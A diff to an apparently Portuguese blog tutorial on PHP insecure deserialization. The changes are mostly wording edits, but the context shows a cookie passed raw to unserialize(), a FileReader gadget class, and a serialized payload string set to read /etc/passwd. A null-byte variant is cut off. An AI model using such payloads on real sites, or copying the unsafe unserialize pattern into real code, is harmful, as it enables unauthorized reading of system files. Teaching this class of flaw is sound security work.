@@ -281,14 +281,14 @@ session_start();
         </div>
 ```
 
-Aqui nosso cookie `extra_themes` é deserializado de forma nuca e crua:
+Aqui nosso cookie `extra_themes` é deserializado de forma nua e crua:
 
 ```php
 <?= isset($_COOKIE['extra_themes']) ? '<p>Extra themes: ' . unserialize($_COOKIE['extra_themes']) . '</p>' : '' ?>
 ```
 
-
- Então procuramos no sistema algumas classes que fazem sentido e achamos a seguinte classe:
+Com essa informação em mãos, que nosso dado é serializado e passa por `unserialize`, agora basta achar um vetor de entrada.
+Então procuramos no sistema algumas classes que fazem sentido, que podem ser utilizadas como vetor e achamos a seguinte classe:
 
 ```php
 class FileReader {
@@ -317,14 +317,16 @@ $obj->filename = '/etc/passwd';
 echo serialize($obj);
 ```
 
-O que resulta na seguinte string:
+Aqui ainda fazemos o require do autoload, o que na verdade nem é necessário! Não precisamos desse arquivo funcional, apenas precisamos que a classe existe no sistema alvo.
+
+o payload acima resulta na seguinte string:
 
 
 ```
 O:14:"App\FileReader":2:{s:11:"*fileName";N;s:8:"filename";s:11:"/etc/passwd";}
 ```
 
-Existe um ponto onde na representação dessa string teriamos nullbytes, então um payload ainda mais funcional para ser enviado em uma requisição seria:
+Existe um ponto onde na representação dessa string teriamos nullbytes (Assunto para outro post), então um payload ainda mais funcional para ser enviado em uma requisição seria:
 
 ```php
 <?php
